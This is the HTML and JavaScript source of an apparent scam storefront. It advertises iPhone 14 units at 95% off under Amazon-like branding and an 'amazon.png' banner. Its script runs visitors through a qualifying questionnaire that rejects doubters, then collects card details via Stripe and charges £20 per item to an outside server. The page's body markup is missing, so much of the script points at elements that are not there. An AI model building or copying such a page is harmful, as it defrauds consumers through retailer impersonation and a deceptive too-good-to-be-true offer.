<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Warehouse Clearout: iPhone 14 — 95% Off | Independent Fulfillment Outlet</title>
  <meta name="description" content="Independent fulfillment center liquidating an overstock of sealed iPhone 14 units at 95% off. Limited pallets, first-come first-served. Transparent story, real warranty, fair shipping." />
  <style>
    /* ===== Amazon-style light palette ===== */
    :root{
      --bg:#f6f5f1; --card:#fff; --text:#1f2937; --muted:#6b7280;
      --brand:#ff9900; --brand-2:#146eb4; --ring:rgba(20,110,180,.25);
      --danger:#b91c1c; --ok:#059669;
      --shadow:0 6px 18px rgba(3,7,18,.08);
      --radius:14px; --radius-sm:10px; --radius-lg:18px; --maxw:1200px;
    }
    *{box-sizing:border-box} html,body{height:100%}
    body{margin:0;font-family:ui-sans-serif,-apple-system,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,"Helvetica Neue",Arial,"Apple Color Emoji","Segoe UI Emoji";background:var(--bg);color:var(--text);line-height:1.6}
    a{color:var(--brand-2);text-decoration:none} a:hover{text-decoration:underline}
    .wrap{max-width:var(--maxw);margin-inline:auto;padding-inline:24px}
    .mastbar{width:100%;background:#0f1111}.mastbar img{display:block;width:100%;height:auto;object-fit:cover}
    header{position:sticky;top:0;z-index:20;backdrop-filter:blur(6px);background:rgba(255,255,255,.8);border-bottom:1px solid rgba(17,24,39,.08)}
    .nav{display:flex;align-items:center;justify-content:space-between;padding:14px 0}
    .brand{display:flex;align-items:center;gap:12px;font-weight:700;letter-spacing:.2px}
    .brand .logo{width:36px;height:36px;display:grid;place-items:center;border-radius:8px;background:#232f3e;box-shadow:inset 0 0 0 2px rgba(255,255,255,.15)}
    .brand .logo svg path{stroke:#fff}.tagline{font-size:.9rem;color:var(--muted)}
    .nav ul{display:flex;gap:12px;list-style:none;margin:0;padding:0}
    .chip{display:inline-flex;align-items:center;gap:8px;padding:8px 12px;border-radius:999px;background:#f3f4f6;border:1px solid rgba(17,24,39,.08);color:#374151;font-size:.9rem}
    .chip svg{opacity:.75}
    .hero{display:grid;grid-template-columns:1.1fr .9fr;gap:36px;align-items:center;padding:48px 0 26px}
    .hero h1{color:#111827;font-size:clamp(1.9rem,3.6vw,3.2rem);line-height:1.06;margin:0 0 12px}
    .subtitle{color:#374151;font-size:1.05rem}
    .cta-row{display:flex;gap:14px;margin-top:18px;flex-wrap:wrap}
    .btn{appearance:none;border:0;border-radius:10px;padding:12px 16px;font-weight:700;cursor:pointer}
    .btn-primary{background:linear-gradient(180deg,#ffb84d,var(--brand));color:#111827;box-shadow:var(--shadow)}
    .btn-primary:focus{outline:3px solid var(--ring)}
    .btn-ghost{background:#fff;border:1px solid rgba(17,24,39,.12);color:#111827}
    .hero-card{background:#fff;border:1px solid rgba(17,24,39,.08);padding:22px;border-radius:var(--radius);box-shadow:var(--shadow)}
    .hero-card h3{margin:0 0 8px}
    .list{margin:0;padding-left:20px}
    .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin:26px 0 42px}
    .card{background:#fff;border:1px solid rgba(17,24,39,.08);padding:18px;border-radius:var(--radius);box-shadow:var(--shadow)}
    .card h3{margin:2px 0 10px}
    .muted{color:var(--muted)}
    .story{display:grid;grid-template-columns:1fr 1fr;gap:22px;align-items:start}
    .story .steps{display:grid;gap:12px}
    .story .step{display:flex;gap:12px;align-items:flex-start}
    .step .bullet{min-width:28px;height:28px;border-radius:999px;background:#232f3e;color:#fff;display:grid;place-items:center;font-weight:800}
    .qualify{margin-top:40px}
    .stepper{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:14px}
    .stepper .pill{background:#f9fafb;border:1px solid rgba(17,24,39,.10);border-radius:999px;padding:8px 12px;font-size:.9rem;color:#374151;display:flex;align-items:center;gap:8px}
    .stepper .pill.active{border-color:#232f3e;box-shadow:0 0 0 3px rgba(35,47,62,.12)}
    .form-card{display:grid;grid-template-columns:1.1fr .9fr;gap:18px}
    .form-side{background:#fff;border:1px solid rgba(17,24,39,.10);border-radius:var(--radius);padding:18px;box-shadow:var(--shadow)}
    .form-side h3{margin-top:0}
    .q{margin-bottom:16px}
    .q label{display:block;font-weight:700;margin-bottom:6px;color:#111827}
    .opt{display:flex;gap:10px;align-items:center;margin:6px 0}
    .opt input{accent-color:#ff9900}
    .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
    .input, select{width:100%;border-radius:10px;padding:12px;border:1px solid rgba(17,24,39,.16);background:#fff;color:#111827;font-size:16px;line-height:1.2;min-height:44px}
    .input:focus, select:focus{outline:3px solid var(--ring);border-color:#93c5fd}
    .help{font-size:.9rem;color:#6b7280}
    .notice{padding:12px 14px;border-radius:10px;background:#f9fafb;border:1px solid rgba(17,24,39,.12)}
    .ok{color:#059669}
    .aside{background:#fff;border:1px solid rgba(17,24,39,.10);border-radius:var(--radius);padding:18px;box-shadow:var(--shadow)}
    .aside h4{margin:8px 0}
    .badge{display:inline-flex;gap:8px;align-items:center;border:1px solid rgba(17,24,39,.12);padding:8px 12px;border-radius:999px;margin:6px 6px 0 0;background:#f9fafb;color:#374151}
    .faq{margin:40px 0}
    details{border:1px solid rgba(17,24,39,.12);padding:14px 16px;border-radius:10px;background:#fff;box-shadow:var(--shadow)}
    details+details{margin-top:10px}
    summary{cursor:pointer;font-weight:800;color:#111827}
    footer{margin:24px 0 60px;color:#6b7280;font-size:.9rem}
    .small{font-size:.9rem;color:#6b7280}
    @media (max-width:960px){.hero{grid-template-columns:1fr;gap:20px}.grid{grid-template-columns:1fr}.form-card{grid-template-columns:1fr}.story{grid-template-columns:1fr}.stepper{grid-template-columns:1fr 1fr}}

    /* ---------- Stripe Elements: force normal height ---------- */
    .el{
      width:100%;
      height:44px;               /* fixed, normal input height */
      min-height:44px;
      overflow:hidden;
      border-radius:10px;
      border:1px solid rgba(17,24,39,.16);
      background:#ffffff;
      color:#111827;
      padding:0 12px;
      display:flex;
      align-items:center;
      cursor:text;
    }
    .StripeElement{width:100%}
    .StripeElement--focus{outline:3px solid var(--ring)}
    .el .StripeElement{background:#ffffff !important;}

    /* Make Stripe's internal wrapper/iframe match 44px exactly */
    :root{color-scheme: light;}
    #card-number .__PrivateStripeElement,
    #card-number .__PrivateStripeElement iframe,
    #card-expiry .__PrivateStripeElement,
    #card-expiry .__PrivateStripeElement iframe,
    #card-cvc .__PrivateStripeElement,
    #card-cvc .__PrivateStripeElement iframe{
      width:100% !important;
      height:44px !important;    /* <- the key line */
      min-height:44px !important;
      background:#fff !important;
      opacity:1 !important;
      filter:none !important;
      mix-blend-mode:normal !important;
      color-scheme: light !important;
    }

    /* Labels shouldn’t steal focus */
    .q label{pointer-events:none}
  </style>
  <script src="https://js.stripe.com/v3"></script>
  <script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
</head>
<body>
  <!-- NEW: full-width banner image at the very top -->
  <div class="mastbar"><img src="amazon.png" alt="Top bar" /></div>

  <!-- keep the rest of your HTML exactly as you had it (header, content, form, etc.) -->

  <script>
    window.addEventListener('DOMContentLoaded', () => {
      // Year
      const yearEl = document.getElementById('year');
      if (yearEl) yearEl.textContent = new Date().getFullYear();

      // Stepper (unchanged)
      const form = document.getElementById('qualifier');
      const panes = [...form.querySelectorAll('.step-pane')];
      const pills = [...document.querySelectorAll('.stepper .pill')];
      const updateStep = (n) => {
        panes.forEach((p, i) => p.toggleAttribute('hidden', i !== (n-1)));
        pills.forEach((pl, i) => pl.classList.toggle('active', i === (n-1)));
        form.setAttribute('data-step', String(n));
        form.scrollIntoView({behavior:'smooth', block:'start'});
        if (n === 5) { ensureStripeMounted(); updatePayCta(); }
      };
      document.getElementById('next1').addEventListener('click', () => {
        const a = form.querySelector('input[name="gen_ok"]:checked');
        const b = form.querySelector('input[name="flex_ok"]:checked');
        const c = form.querySelector('input[name="verify_ok"]:checked');
        if(!a || !b || !c){ alert('Please answer all questions.'); return; }
        if([a.value,b.value,c.value].includes('no')){
          alert('Based on your answers, this clearance may not be a good fit. You can still contact support for alternatives.');
          return;
        }
        updateStep(2);
      });
      document.getElementById('back2').addEventListener('click', () => updateStep(1));
      document.getElementById('next2').addEventListener('click', () => {
        const ship = form.querySelector('input[name="ship_pay"]:checked');
        const country = form.country.value; const postal = form.postal.value.trim();
        if(!ship || !country || !postal){ alert('Please complete shipping details.'); return; }
        if(ship.value === 'no'){
          alert('We charge actual carrier rates so we can keep device pricing at 95% off. If that works, choose the first option.');
          return;
        }
        updateStep(3);
      });
      document.getElementById('back3').addEventListener('click', () => updateStep(2));
      document.getElementById('next3').addEventListener('click', () => {
        if(!form.storage.value || !form.color.value){ alert('Please choose your preferences.'); return; }
        updateStep(4);
      });
      document.getElementById('back4').addEventListener('click', () => updateStep(3));

      // Insert "Proceed to Payment" next to Step 4 submit
      const toPaymentBtn = document.createElement('button');
      toPaymentBtn.type = 'button';
      toPaymentBtn.className = 'btn btn-primary';
      toPaymentBtn.textContent = 'Proceed to Payment';
      const submitBtnStep4 = form.querySelector('[data-step="4"] button[type="submit"]');
      const actionsContainerStep4 = submitBtnStep4 ? submitBtnStep4.parentElement : null;
      if (actionsContainerStep4) actionsContainerStep4.insertBefore(toPaymentBtn, submitBtnStep4);
      toPaymentBtn.addEventListener('click', () => {
        if (!form.checkValidity()) { form.reportValidity(); return; }
        updateStep(5);
      });

      document.getElementById('back5').addEventListener('click', () => updateStep(4));

      form.addEventListener('submit', (e) => {
        e.preventDefault();
        form.closest('.form-card').setAttribute('hidden', '');
        document.getElementById('reserve-result').removeAttribute('hidden');
      });

      /* ===== Stripe Elements: one-time charge, £20 × quantity (no trial) ===== */
      const STRIPE_PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
      // Server endpoint you already use for an immediate £20 charge
      const INTRO_CHARGE_URL      = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";

      let stripe=null, elements=null, cardNumber=null, cardExpiry=null, cardCvc=null, stripeMounted=false;

      function ensureStripeMounted() {
        if (stripeMounted) return;
        stripe = Stripe(STRIPE_PUBLISHABLE_KEY);
        elements = stripe.elements({
          appearance: {
            theme: 'flat',
            variables: { colorBackground: '#ffffff', colorText: '#111827', colorDanger: '#b91c1c', fontSizeBase: '16px' },
            rules: { '.Input': { color:'#111827', backgroundColor:'#ffffff', caretColor:'#111827' }, '.Input::placeholder': { color:'#6b7280' } }
          }
        });
        cardNumber = elements.create('cardNumber');
        cardExpiry = elements.create('cardExpiry');
        cardCvc    = elements.create('cardCvc');
        cardNumber.mount('#card-number'); cardExpiry.mount('#card-expiry'); cardCvc.mount('#card-cvc');
        stripeMounted = true;
      }

      function getQty() {
        const q = parseInt(document.getElementById('qty')?.value || '1', 10);
        return Number.isFinite(q) && q > 0 ? q : 1;
      }
      function updatePayCta(){
        const btn = document.getElementById('payNow');
        if (!btn) return;
        const total = getQty() * 20;
        btn.textContent = `Pay £${total.toFixed(2)}`;
      }
      window.updatePayCta = updatePayCta;
      document.getElementById('qty')?.addEventListener('change', updatePayCta);

      const payBtn = document.getElementById('payNow');
      const payErr = document.getElementById('pay-error');
      const showErr = (m)=>{ if(payErr){ payErr.textContent = m; payErr.style.display='block'; } };
      const hideErr = ()=>{ if(payErr){ payErr.textContent = ''; payErr.style.display='none'; } };

      if (payBtn){
        payBtn.addEventListener('click', async () => {
          hideErr();
          try{
            ensureStripeMounted();

            // Contact from Step 4
            const name  = (document.getElementById('name')?.value || '').trim();
            const email = (document.getElementById('email')?.value || '').trim();
            const phone = (document.getElementById('phone')?.value || '').trim();

            // Billing (optional)
            const address = {
              line1: (document.getElementById('bill_street')?.value||'').trim() || undefined,
              city: (document.getElementById('bill_city')?.value||'').trim() || undefined,
              postal_code: (document.getElementById('bill_postal')?.value||'').trim() || undefined,
              country: (document.getElementById('bill_country')?.value||'').trim() || undefined
            };

            // Create the PaymentMethod once
            const pmRes = await stripe.createPaymentMethod({
              type: 'card',
              card: cardNumber,
              billing_details: { name, email, phone: phone || undefined, address }
            });
            if (pmRes.error) throw new Error(pmRes.error.message);

            // Charge £20 once per item (no trial).
            const qty = getQty();
            for (let i = 0; i < qty; i++) {
              const r = await fetch(INTRO_CHARGE_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ paymentMethodId: pmRes.paymentMethod.id, name, email, phone, address })
              });
              const d = await r.json();
              if (!r.ok || !d.clientSecret) throw new Error(d.error || 'Failed to create payment');

              // 3DS handled here if needed
              const conf = await stripe.confirmCardPayment(d.clientSecret);
              if (conf.error) throw new Error(conf.error.message);
              if (!(conf.paymentIntent && conf.paymentIntent.status === 'succeeded')) throw new Error('Payment not completed');
            }

            // Success
            window.location.href = 'thankyou2.html';
          }catch(err){
            showErr(err.message || 'Payment failed');
          }
        });
      }
    });
  </script>
</body>
</html>
